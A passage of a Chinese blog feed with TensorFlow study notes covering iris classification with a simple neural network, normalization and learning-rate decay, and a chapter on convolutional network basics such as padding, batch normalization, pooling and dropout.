<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919787.png" alt="三方运算"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919906.png" alt="矩阵乘法"></p>
<p>注：矩阵乘法的计算过程要知道。</p>
<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919907.png" alt="配对"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919908.png" alt="eg"></p>
<p>代码示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">features = tf.constant([<span class="number">12</span>, <span class="number">23</span>, <span class="number">10</span>, <span class="number">17</span>])</span><br><span class="line">labels = tf.constant([<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line">dataset = tf.data.Dataset.from_tensor_slices((features, labels))</span><br><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> dataset:</span><br><span class="line">    <span class="built_in">print</span>(element)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919914.png" alt="求导+with"></p>
<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919915.png" alt="索引"></p>
<p>注：可利用 enumerate(列表名)函数枚举出每一个元素，并在元素前配上对应的索引号，常在 for 循环中使用。</p>
<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919916.png" alt="one_hot"></p>
<p>注：可用<code>tf.one_hot(待转换数据，depth=几分类)</code>函数实现用<strong>独热码</strong>表示标签，在分类问题中很常见。标记类别为为 1 和 0，其中 1 表示是，0 表示非。如在鸢尾花分类任务中，如果标签是 1，表示分类结果是 1 杂色鸢尾，其用把它用独热码表示就是 0,1,0，这样可以表示出每个分类的概率：也就是百分之 0 的可能是 0狗尾草鸢尾，百分百的可能是 1 杂色鸢尾，百分之 0 的可能是弗吉尼亚鸢尾。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919917.png" alt="eg"></p>
<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919990.png" alt="softmax"><br>注：属于激活函数的一种，用于将输出的结果转换为符合的概率分布，用于与独热码匹配。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919989.png" alt="eg"></p>
<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919997.png" alt="自减"></p>
<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919998.png" alt="取下标"></p>
<h1 id="实例：神经网络实现鸢尾花分类（简化）"><a href="#实例：神经网络实现鸢尾花分类（简化）" class="headerlink" title="实例：神经网络实现鸢尾花分类（简化）"></a>实例：神经网络实现鸢尾花分类（简化）</h1><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074920095.png" alt="数据集"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074920084.png" alt="数据集导入"><br>注：data的格式为150x4的矩阵，target的格式为150的数组。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074920091.png" alt="结构"></p>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># 利用鸢尾花数据集，实现前向传播、反向传播，可视化loss曲线</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入所需模块</span></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入数据，分别为输入特征和标签</span></span><br><span class="line"><span class="comment"># scikit-learn 内置有一些小型标准数据集，不需要从某个外部网站下载任何文件，用datasets.load_xx()加载。</span></span><br><span class="line">x_data = datasets.load_iris().data</span><br><span class="line">y_data = datasets.load_iris().target</span><br><span class="line"><span class="built_in">print</span>(x_data, y_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机打乱数据（因为原始数据是顺序的，顺序不打乱会影响准确率）</span></span><br><span class="line"><span class="comment"># seed: 随机数种子，是一个整数，当设置之后，每次生成的随机数都一样（为方便教学，以保每位同学结果一致）</span></span><br><span class="line">np.random.seed(<span class="number">116</span>)  <span class="comment"># 使用相同的seed，保证输入特征和标签一一对应</span></span><br><span class="line">np.random.shuffle(x_data)</span><br><span class="line">np.random.seed(<span class="number">116</span>)</span><br><span class="line">np.random.shuffle(y_data)</span><br><span class="line">tf.random.set_seed(<span class="number">116</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将打乱后的数据集分割为训练集和测试集，训练集为前120行，测试集为后30行</span></span><br><span class="line">x_train = x_data[:-<span class="number">30</span>]</span><br><span class="line">y_train = y_data[:-<span class="number">30</span>]</span><br><span class="line">x_test = x_data[-<span class="number">30</span>:]</span><br><span class="line">y_test = y_data[-<span class="number">30</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换x的数据类型，否则后面矩阵相乘时会因数据类型不一致报错</span></span><br><span class="line">x_train = tf.cast(x_train, tf.float32)</span><br><span class="line">x_test = tf.cast(x_test, tf.float32)</span><br><span class="line"></span><br><span class="line"><span class="comment"># from_tensor_slices函数使输入特征和标签值一一对应。（把数据集分批次，每个批次batch组数据）</span></span><br><span class="line">train_db = tf.data.Dataset.from_tensor_slices((x_train, y_train)).batch(<span class="number">32</span>)</span><br><span class="line">test_db = tf.data.Dataset.from_tensor_slices((x_test, y_test)).batch(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成神经网络的参数，4个输入特征故，输入层为4个输入节点；因为3分类，故输出层为3个神经元</span></span><br><span class="line"><span class="comment"># 用tf.Variable()标记参数可训练</span></span><br><span class="line"><span class="comment"># 使用seed使每次生成的随机数相同（方便教学，使大家结果都一致，在现实使用时不写seed）</span></span><br><span class="line">w1 = tf.Variable(tf.random.truncated_normal([<span class="number">4</span>, <span class="number">3</span>], stddev=<span class="number">0.1</span>, seed=<span class="number">1</span>))</span><br><span class="line">b1 = tf.Variable(tf.random.truncated_normal([<span class="number">3</span>], stddev=<span class="number">0.1</span>, seed=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">lr = <span class="number">0.1</span>  <span class="comment"># 学习率为0.1</span></span><br><span class="line">train_loss_results = []  <span class="comment"># 将每轮的loss记录在此列表中，为后续画loss曲线提供数据</span></span><br><span class="line">test_acc = []  <span class="comment"># 将每轮的acc记录在此列表中，为后续画acc曲线提供数据</span></span><br><span class="line">epoch = <span class="number">500</span>  <span class="comment"># 循环500轮</span></span><br><span class="line">loss_all = <span class="number">0</span>  <span class="comment"># 每轮分4个step，loss_all记录四个step生成的4个loss的和</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练部分</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(epoch):  <span class="comment"># 数据集级别的循环，每个epoch循环一次数据集</span></span><br><span class="line">    <span class="keyword">for</span> step, (x_train, y_train) <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_db):  <span class="comment"># batch级别的循环 ，每个step循环一个batch</span></span><br><span class="line">        <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># with结构记录梯度信息</span></span><br><span class="line">            y = tf.matmul(x_train, w1) + b1  <span class="comment"># 神经网络乘加运算</span></span><br><span class="line">            y = tf.nn.softmax(y)  <span class="comment"># 使输出y符合概率分布（此操作后与独热码同量级，可相减求loss）</span></span><br><span class="line">            y_ = tf.one_hot(y_train, depth=<span class="number">3</span>)  <span class="comment"># 将标签值转换为独热码格式，方便计算loss和accuracy</span></span><br><span class="line">            loss = tf.reduce_mean(tf.square(y_ - y))  <span class="comment"># 采用均方误差损失函数mse = mean(sum(y-out)^2)</span></span><br><span class="line">            loss_all += loss.numpy()  <span class="comment"># 将每个step计算出的loss累加，为后续求loss平均值提供数据，这样计算的loss更准确</span></span><br><span class="line">        <span class="comment"># 计算loss对各个参数的梯度</span></span><br><span class="line">        grads = tape.gradient(loss, [w1, b1])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 实现梯度更新 w1 = w1 - lr * w1_grad    b = b - lr * b_grad</span></span><br><span class="line">        w1.assign_sub(lr * grads[<span class="number">0</span>])  <span class="comment"># 参数w1自更新</span></span><br><span class="line">        b1.assign_sub(lr * grads[<span class="number">1</span>])  <span class="comment"># 参数b自更新</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每个epoch，打印loss信息</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Epoch &#123;&#125;, loss: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(epoch, loss_all/<span class="number">4</span>))</span><br><span class="line">    train_loss_results.append(loss_all / <span class="number">4</span>)  <span class="comment"># 将4个step的loss求平均记录在此变量中</span></span><br><span class="line">    loss_all = <span class="number">0</span>  <span class="comment"># loss_all归零，为记录下一个epoch的loss做准备</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 测试部分</span></span><br><span class="line">    <span class="comment"># total_correct为预测对的样本个数, total_number为测试的总样本数，将这两个变量都初始化为0</span></span><br><span class="line">    total_correct, total_number = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x_test, y_test <span class="keyword">in</span> test_db:</span><br><span class="line">        <span class="comment"># 使用更新后的参数进行预测</span></span><br><span class="line">        y = tf.matmul(x_test, w1) + b1</span><br><span class="line">        y = tf.nn.softmax(y)</span><br><span class="line">        pred = tf.argmax(y, axis=<span class="number">1</span>)  <span class="comment"># 返回y中最大值的索引，即预测的分类</span></span><br><span class="line">        <span class="comment"># 将pred转换为y_test的数据类型</span></span><br><span class="line">        pred = tf.cast(pred, dtype=y_test.dtype)</span><br><span class="line">        <span class="comment"># 若分类正确，则correct=1，否则为0，将bool型的结果转换为int型</span></span><br><span class="line">        correct = tf.cast(tf.equal(pred, y_test), dtype=tf.int32)</span><br><span class="line">        <span class="comment"># 将每个batch的correct数加起来</span></span><br><span class="line">        correct = tf.reduce_sum(correct)</span><br><span class="line">        <span class="comment"># 将所有batch中的correct数加起来</span></span><br><span class="line">        total_correct += <span class="built_in">int</span>(correct)</span><br><span class="line">        <span class="comment"># total_number为测试的总样本数，也就是x_test的行数，shape[0]返回变量的行数</span></span><br><span class="line">        total_number += x_test.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 总的准确率等于total_correct/total_number</span></span><br><span class="line">    acc = total_correct / total_number</span><br><span class="line">    test_acc.append(acc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Test_acc:&quot;</span>, acc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制 loss 曲线</span></span><br><span class="line">plt.title(<span class="string">&#x27;Loss Function Curve&#x27;</span>)  <span class="comment"># 图片标题</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Epoch&#x27;</span>)  <span class="comment"># x轴变量名称</span></span><br><span class="line">plt.ylabel(<span class="string">&#x27;Loss&#x27;</span>)  <span class="comment"># y轴变量名称</span></span><br><span class="line">plt.plot(train_loss_results, label=<span class="string">&quot;$Loss$&quot;</span>)  <span class="comment"># 逐点画出trian_loss_results值并连线，连线图标是Loss</span></span><br><span class="line">plt.legend()  <span class="comment"># 画出曲线图标</span></span><br><span class="line">plt.show()  <span class="comment"># 画出图像</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制 Accuracy 曲线</span></span><br><span class="line">plt.title(<span class="string">&#x27;Acc Curve&#x27;</span>)  <span class="comment"># 图片标题</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Epoch&#x27;</span>)  <span class="comment"># x轴变量名称</span></span><br><span class="line">plt.ylabel(<span class="string">&#x27;Acc&#x27;</span>)  <span class="comment"># y轴变量名称</span></span><br><span class="line">plt.plot(test_acc, label=<span class="string">&quot;$Accuracy$&quot;</span>)  <span class="comment"># 逐点画出test_acc值并连线，连线图标是Accuracy</span></span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>对以上代码的补充分析：</p>
</blockquote>
<p>1、数据集读入、数据集乱序、将数据集分割成永不相见的训练集和测试集、将数据配成[输入特征，标签]对。</p>
<p>补充1：<br>人类在认识这个世界的时候信息是没有规律的，杂乱无章的涌入大脑的，所以喂入神经网络的<strong>数据集</strong>也需要被打乱顺序。</p>
<p>补充2：<br>因为使用了<strong>同样的随机种子</strong>，所以打乱顺序后输入特征和标签仍然是<strong>一一对应</strong>的。</p>
<p>补充3：<br>使用 from_tensor_slices 把训练集的输入特征和标签<strong>配对打包</strong>，将每 32 组输入特征标签对打包为一个 batch，在喂入神经网络时会以 <strong>batch 为单位</strong>喂入。</p>
<blockquote>
<p>训练过程？</p>
</blockquote>
<p>补充1：<br>用两层 for 循环进行更新参数：第一层 for 循环是针对<strong>整个数据集</strong>进行循环，故用 epoch 表示；第二层 for 循环是<strong>针对 batch</strong>的，用 step 表示。</p>
<p>补充2：<br>因为训练集有 120 组数据，batch 是 32，每个 step 只能喂入 32 组数据，需要 <strong>batch 级别循环 4 次</strong>，所以 loss 除以 4，求得每次 step 迭代的平均 loss。</p>
<h1 id="扩展方法"><a href="#扩展方法" class="headerlink" title="扩展方法"></a>扩展方法</h1><blockquote>
<p>梯度爆炸?</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074920077.png"></p>
<p>参数更新量为学习率与损失函数偏导数相乘，二者乘积过大，则会导致梯度爆炸。<br>解决梯度爆炸问题可针对学习率进行调整，也可对数据进行调整。</p>
<p>故解决方法可为：<br>(1)<strong>逐步减小</strong>学习率，0.1、0.01 等；<br>(2)对数据进行预处理后再输入神经网络，减小偏差值的大小，抑制梯度爆炸，即数据<strong>归一化与标准化</strong>，其主要方法有<strong>线性归一化</strong>、<strong>非线性归一化</strong>、<strong>Z-Score 标准化</strong>。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074920081.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074920082.png"></p>
<p>以线性归一化为例，其代码实现如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">normalize</span>(<span class="params">data</span>):</span><br><span class="line">	x_data = data.T <span class="comment"># 每一列为同一属性，转置到每一行</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">		x_data[i] = (x_data[i] - tf.reduce_min(x_data[i])) / </span><br><span class="line">		(tf.reduce_max(x_data[i]) - tf.reduce_min(x_data[i]))</span><br><span class="line"> 	<span class="keyword">return</span> x_data.T <span class="comment"># 转置回原格式</span></span><br></pre></td></tr></table></figure>

<p>指数衰减学习率：指数衰减学习率可在训练初期赋予网络较大学习率，并在训练过程中逐步减小，可有效增加网络收敛速度。<br>在 tensorflow 中对应函数为<br><code>tf.compat.v1.train.exponential_decay(learning_rate_base,global_step,decay_step,deca y_rate,staircase =True(False),name)</code>，当 staircase 为 True 时，学习率呈现阶梯状递减。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074920083.png" alt="学习率"></p>
]]></content>
      <categories>
        <category>【-基础知识-】人工智能</category>
        <category>TensorFlow实践</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>TensorFlow笔记--ch5 卷积神经网络</title>
    <url>/2023/05/01/TensorFlow%E7%AC%94%E8%AE%B0--ch5%20%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<blockquote>
<p>写在前面</p>
<blockquote>
<p>由于种种原因，关于本章的部分内容不会很详细，旨在了解大体过程，为下面的循环神经网络的重点学习做铺垫。</p>
</blockquote>
</blockquote>
<h1 id="卷积计算过程"><a href="#卷积计算过程" class="headerlink" title="卷积计算过程"></a>卷积计算过程</h1><h2 id="全连接神经网络回顾"><a href="#全连接神经网络回顾" class="headerlink" title="全连接神经网络回顾"></a>全连接神经网络回顾</h2><blockquote>
<p>全连接NN：每个神经元与前后相邻层的每一个神经元都有<strong>连接关系</strong>，输入是特征，输出为预测的结果</p>
</blockquote>
<p>以MNIST数据集为例：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727461.png"></p>
<p>仅仅是输入黑白灰度值数据就有10万多个待优化参数，我们在实际项目中多是高分辨率彩色图，待优化的参数会更多，很容易造成过拟合。</p>
<p>如下是图像对比：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727554.png" alt="图像对比"></p>
<h2 id="特征提取"><a href="#特征提取" class="headerlink" title="特征提取"></a>特征提取</h2><blockquote>
<p>实际应用时会先对原始图像进行<strong>特征提取</strong>再把提取到的特征送给<strong>全连接网络</strong></p>
</blockquote>
<p>下图是过程实例：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727542.png" alt="特征提取"></p>
<blockquote>
<p>卷积计算可认为是一种有效<strong>提取图像特征</strong>的方法</p>
</blockquote>
<p>一般会用一个正方形的<strong>卷积核</strong>，按<strong>指定步长</strong>，在输入特征图上<strong>滑动</strong>，<strong>遍历</strong>输入特征图中的每个像素点。每一个步长，卷积核会与输入特征图出现<strong>重合区域</strong>，重合区域对应元素相乘、求和再加上偏置项得到<strong>输出特征</strong>的一个像素点。</p>
<ul>
<li>输入特征图的<strong>深度</strong>（channel数），决定了当前层卷积核的<strong>深度</strong>；</li>
<li>当前层<strong>卷积核</strong>的个数，决定了当前层<strong>输出特征图</strong>的深度。</li>
</ul>
<p>下图是卷积计算过程：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727544.png"></p>
<p>经过卷积核的特征提取，我们的输入特征就会十分精简，利于优化，减少过拟合。</p>
<h1 id="感受野（Receptive-Field）"><a href="#感受野（Receptive-Field）" class="headerlink" title="感受野（Receptive Field）"></a>感受野（Receptive Field）</h1><blockquote>
<p>卷积神经网络各<strong>输出特征图</strong>中的每个像素点，在<strong>原始输入图</strong>片上映射区域的大小。</p>
</blockquote>
<p>下图是感受野的示例：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727545.png"></p>
<p>可知，对于多次卷积核得到的输出特征图的感受野也是与最原始的特征图比较的。<br>同时通过图最下方的计算，可以知道对于x大于10的特征图，选择两层3x3的卷积核更好。</p>
<h1 id="全零填充（Padding）"><a href="#全零填充（Padding）" class="headerlink" title="全零填充（Padding）"></a>全零填充（Padding）</h1><blockquote>
<p>前面我们知道，在经过特征提取后的输出特征图的维度要比原始特征图小，如果<strong>不想改变特征图的维度</strong>，可以使用全零填充，即在原始特征图的一周添加0，再使用卷积核滑过。</p>
</blockquote>
<p>下图是<strong>全零填充</strong>的示例：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727459.png"></p>
<p>下面给出输出特征图的<strong>边长计算公式</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727457.png"></p>
<p><strong>TensorFlow</strong>的使用：</p>
<ul>
<li>用参数<code>padding=‘SAME’</code>或<code>padding=‘VALID’</code>表示</li>
</ul>
<p>下图给出了边长的<strong>计算过程</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727448.png"></p>
<h1 id="TF描述卷积层"><a href="#TF描述卷积层" class="headerlink" title="TF描述卷积层"></a>TF描述卷积层</h1><blockquote>
<p>前面我们已经了解了卷积神经网络的计算过程，下面我们就要使用TensorFlow实现上述计算过程，这个过程不需要复杂的底层运算，只需要我们给出需要的<strong>参数</strong>即可。</p>
</blockquote>
<p>下面是定义卷积层的代码规范：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tf.keras.layers.Conv2D (</span><br><span class="line">filters= 卷积核个数, </span><br><span class="line">kernel_size= 卷积核尺寸, <span class="comment">#正方形写核长整数，或（核高h，核宽w）</span></span><br><span class="line">strides= 滑动步长, <span class="comment">#横纵向相同写步长整数，或(纵向步长h，横向步长w)，默认1 </span></span><br><span class="line">padding= “same” <span class="keyword">or</span> “valid”, <span class="comment">#使用全零填充是“same”，不使用是“valid”（默认）</span></span><br><span class="line">activation= “ relu” <span class="keyword">or</span> “ sigmoid ” <span class="keyword">or</span> “ tanh ” <span class="keyword">or</span> “ softmax”等, <span class="comment">#如有BN此处不写</span></span><br><span class="line">input_shape= (高, 宽, 通道数)      <span class="comment">#输入特征图维度，可省略</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>上述代码为tf.keras.models.Sequential()的一部分，写在全连接层之前。</p>
<h1 id="批标准化（Batch-Normalization，BN）"><a href="#批标准化（Batch-Normalization，BN）" class="headerlink" title="批标准化（Batch Normalization，BN）"></a>批标准化（Batch Normalization，BN）</h1><blockquote>
<p>神经网络对0附近的数据更加敏感，但是随着网络层数的增加，特征数据会出现偏离0均值的情况。这时候就需要进行标准化处理。</p>
</blockquote>
<ul>
<li><strong>标准化</strong>：使数据符合0均值，1为标准差的分布。</li>
<li><strong>批标准化</strong>：对一小批数据（<strong>batch</strong>），做标准化处理。</li>
</ul>
<p>批标准化后，第k个卷积核的输出特征图（feature map）中第i个像素点：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727458.png"></p>
<p>上图给出了标准化的计算公式，以一个batch为单位进行数据的处理，使得数据回归到0为均值的状态。</p>
<p>我们来看一下标准化过后的数据偏移情况：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727243.png"></p>
<p>可见，经过标准化后的数据分布在计划函数的<strong>线性区</strong>，使得输入数据的<strong>微小变化</strong>更明显的体现到激活函数的输出，提升了激活函数对输入数据的区分力。</p>
<p>但是，上面那种简单的标准化处理使得数据完全满足正态分布，让数据分布在线性区，使得激活函数丧失了非线性特性，因此我们在BN操作上为每一个卷积核引入了<strong>两个可训练参数</strong>，这两个参数也是与其余参数一同优化，通过这两个参数实现数据的<strong>缩放和偏移</strong>，保证了网络的<strong>非线性表达力</strong>。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727455.png"></p>
<hr>
<blockquote>
<p>批标准化的代码实现：</p>
</blockquote>
<p>批标准化位于卷积层和激活函数层之间，在TensorFlow中以下面的代码进行描述：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727437.png"></p>
<h1 id="池化（Pooling）"><a href="#池化（Pooling）" class="headerlink" title="池化（Pooling）"></a>池化（Pooling）</h1><blockquote>
<p>所谓池化，就是通过池化核减少特征数量。</p>
</blockquote>
<ul>
<li>最大池化：MaxPool2D：提取图片纹理</li>
<li>均值池化：.AveragePooling2D:保留图片背景</li>
</ul>
<p>下图给出了池化的过程：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727462.png"></p>
<p>可以看到，特征数据的数量变少了，同时二种池化方式的原理也很清楚。</p>
<hr>
<blockquote>
<p>池化的代码实现：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tf.keras.layers.MaxPool2D(</span><br><span class="line">pool_size = 池化核尺寸,</span><br><span class="line">strides = 池化步长,</span><br><span class="line">padding = ‘SAME’ <span class="keyword">or</span> ‘VALID’ )</span><br><span class="line">tf.keras.layers.AveragePooling2D(</span><br><span class="line">pool_size = 池化核尺寸,</span><br><span class="line">strides = 池化步长,</span><br><span class="line">padding = ‘SAME’ <span class="keyword">or</span> ‘VALID’ )</span><br></pre></td></tr></table></figure>

<h1 id="舍弃（Dropout"><a href="#舍弃（Dropout" class="headerlink" title="舍弃（Dropout)"></a>舍弃（Dropout)</h1><blockquote>
<p>在神经网络<strong>训练时</strong>，将一部分神经元按照一定概率从神经网络中暂时舍弃。神经网络<strong>使用时</strong>，被舍弃的神经元恢复链接。</p>
</blockquote>
<p>下图给出了舍弃操作的示例：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727460.png"></p>
<hr>
<blockquote>
<p>舍弃操作的代码实现：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727456.png"></p>
</blockquote>
<h1 id="卷积神经网络"><a href="#卷积神经网络" class="headerlink" title="卷积神经网络"></a>卷积神经网络</h1><blockquote>
<p>经过上述内容的学习，我们已经对卷积神经网络有了清晰的认识，下面我们来回顾梳理一下。</p>
</blockquote>
<p><strong>卷积神经网络</strong>：借助卷积核提取特征后，送人全连接神经网络。</p>
<p><strong>主要模块</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727463.png"></p>
<hr>
<p>W：卷积是什么？<br>D：特征提取器，CBAPD.<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648350727438.png"></p>
<blockquote>
<p>写在最后</p>
</blockquote>
<p>关于卷积神经网络的部分内容就先到这里，课程内还要一些示例与扩展，这里先不进行。以后在系统学习机器学习时会再详细进行，并附上链接。</p>
<p>最后，再默念一句：特征提取器，CBAPD。</p>
]]></content>
      <categories>
        <category>【-基础知识-】人工智能</category>
        <category>TensorFlow实践</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>TensorFlow笔记--ch4 神经网络八股扩展</title>
    <url>/2023/05/01/TensorFlow%E7%AC%94%E8%AE%B0--ch4%20%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%AB%E8%82%A1%E6%89%A9%E5%B1%95/</url>
    <content><![CDATA[<h1 id="前节回顾与本节扩展"><a href="#前节回顾与本节扩展" class="headerlink" title="前节回顾与本节扩展"></a>前节回顾与本节扩展</h1><p>在正式开始学习之前，我们先来整理一下大体框架，让我们对接下来要学习的知识有一个清晰认识。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074875542.png" alt="扩展"></p>
<p>上图标画的部分就是接下来要学习的部分，在上一节使用六步法搭建神经网络的基础上，与实际问题相结合，解决一系列问题，实现神经网络的深度优化。</p>
<blockquote>
<p>本节目录：</p>
</blockquote>
<ul>
<li>①自制数据集，解决本领域应用</li>
<li>②数据增强，扩充数据集</li>
<li>③断点续训，存取模型</li>
<li>④参数提取，把参数存入文本</li>
<li>⑤acc&#x2F;loss可视化，查看训练效果</li>
<li>⑥应用程序，给图识物</li>
</ul>
<p>下面我们依次介绍。</p>
